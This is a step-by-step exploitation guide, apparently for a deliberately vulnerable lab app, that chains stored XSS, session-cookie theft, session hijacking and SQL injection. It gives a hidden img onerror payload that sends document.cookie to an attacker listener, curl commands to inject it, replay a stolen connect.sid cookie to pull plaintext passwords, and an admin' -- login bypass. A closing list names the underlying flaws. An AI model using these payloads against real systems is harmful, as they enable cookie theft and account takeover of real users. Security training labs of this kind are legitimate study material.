# Exploitation Guide: External User to full compromise

This guide details the complete attack chain:
1.  **Attack 1 (XSS)**: An external user steals an Analyst's session cookie.
2.  **Attack 2 (Exfiltration)**: The script sends the cookie to an attacker-controlled listener.
3.  **Attack 3 (Session Hijacking)**: The attacker uses the stolen cookie to find sensitive credentials (at `/api/analyst/profile`).
4.  **Attack 4 (SQLi)**: The attacker, now "acting" as an Analyst, exploits SQL Injection to become Admin.

---

## Step 0: Setup Attacker Listener
Run the attacker server locally to capture cookies:
```bash
python3 attacker/server.py
```
This listener runs on port 7000 and saves cookies to `attacker/cookie/`.

---

## Step 1: External User Injects XSS
As a "normal user", submit a support ticket via the Flask API.

**The Payload**:
The script will now look like normal text, with a hidden payload that executes when rendered by the dashboard.
```html
Please investigate the reported issue. <img src=x style="display:none" onerror="fetch('http://localhost:7000/log?c=' + btoa(document.cookie))">
```

**The Command**:
```bash
curl -s -X POST http://localhost:5000/ticket \
     -H "Content-Type: application/json" \
     -d '{
       "subject": "System Update",
       "issue": "Please investigate the reported issue. <img src=x style=\"display:none\" onerror=\"fetch('\''http://localhost:7000/log?c='\'' + btoa(document.cookie))\">",
       "namespace": "network-dept"
     }'
```

---

## Step 2: Analyst Logs In (The Victim)
When the Analyst (`analyst1` / `password123`) logs in at `http://localhost:3000/analyst_login.html` and views the dashboard, the script executes. 

Check `attacker/cookie/` for the captured session cookie.

---

## Step 3: Hijack Session & Steal Credentials
Once you have the `connect.sid` cookie value, you can call the sensitive profile endpoint.

**Command**:
```bash
# Verify access using the stolen cookie to get plaintext password
curl --cookie "connect.sid=STOLEN_COOKIE_VALUE_HERE" \
     http://localhost:3000/api/analyst/profile
```

---

## Step 4: Become Admin via SQL Injection
Now login as the analyst yourself, or directly target the Admin login bypass.

**Command**:
```bash
curl --cookie "connect.sid=STOLEN_COOKIE_VALUE_HERE" \
     -d "username=admin' --&password=anything" \
     http://localhost:3000/admin/login
```

---

## Vulnerability Details
-   **Stored XSS**: Flask service (`/ticket`) accepts raw HTML, which is then rendered by Node.js using `.innerHTML`.
-   **Insecure Cookies**: Node.js session cookie has `httpOnly: false`, allowing JavaScript access.
-   **Credential Disclosure**: `/api/analyst/profile` returns plaintext passwords if authenticated.
-   **SQL Injection**: Node.js `/admin/login` uses string concatenation for queries.
